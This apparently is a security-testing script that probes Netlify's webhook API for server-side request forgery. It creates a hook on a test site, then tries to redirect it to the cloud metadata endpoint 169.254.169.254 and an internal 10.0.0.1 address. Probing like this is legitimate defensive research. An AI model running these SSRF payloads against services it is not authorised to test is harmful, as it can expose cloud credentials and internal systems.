# -*- coding: utf-8 -*-
# _hk_probe1.py - hooks CRUD structure + url-update SSRF validation check
import sys, os, json, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _net_creds import TOKEN_A, SITE_A

API = "https://api.netlify.com/api/v1"

def req(method, url, tok=None, body=None, timeout=25):
    r = urllib.request.Request(url, method=method)
    if tok:
        r.add_header("Authorization", "Bearer " + tok)
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, data=data, timeout=timeout) as resp:
            b = resp.read(30000)
            try:
                return resp.status, json.loads(b.decode("utf-8", "replace"))
            except Exception:
                return resp.status, b[:500]
    except urllib.error.HTTPError as e:
        b = e.read(4000)
        try:
            return e.code, json.loads(b.decode("utf-8", "replace"))
        except Exception:
            return e.code, b[:400]
    except Exception as ex:
        return -1, str(ex)[:200]

# 1. create a benign url hook on SITE_A (pointing to its own public domain)
body = {"type": "url", "data": {"url": "https://sec-test-rcf6lz.netlify.app/hooktest"}}
s, b = req("POST", API + "/hooks", tok=TOKEN_A, body=body)
print("POST /hooks ->", s)
print(json.dumps(b, ensure_ascii=False, indent=1)[:2500] if isinstance(b, (dict, list)) else repr(b)[:400])
if not (isinstance(b, dict) and b.get("id")):
    sys.exit(1)
HID = b["id"]
print("hook id:", HID)

# 2. GET hook detail (structure: does it have event/state/history fields?)
s, b = req("GET", API + "/hooks/%s" % HID, tok=TOKEN_A)
print()
print("GET /hooks/%s -> %s" % (HID, s))
print(json.dumps(b, ensure_ascii=False, indent=1)[:2500] if isinstance(b, (dict, list)) else repr(b)[:400])

# 3. try PATCH/PUT url to internal IP (validation check on update)
print()
for m in ("PUT", "PATCH"):
    for u in ("http://169.254.169.254/latest/meta-data/", "http://10.0.0.1/x"):
        s, b = req(m, API + "/hooks/%s" % HID, tok=TOKEN_A, body={"type": "url", "data": {"url": u}})
        msg = json.dumps(b, ensure_ascii=False)[:250] if isinstance(b, (dict, list)) else repr(b)[:200]
        print("%s url=%s -> %s %s" % (m, u, s, msg))

# 4. GET hooks list w/ site filter to see fields
s, b = req("GET", API + "/hooks?site_id=%s" % SITE_A, tok=TOKEN_A)
print()
print("GET /hooks?site_id ->", s)
print(json.dumps(b, ensure_ascii=False, indent=1)[:2500] if isinstance(b, (dict, list)) else repr(b)[:400])
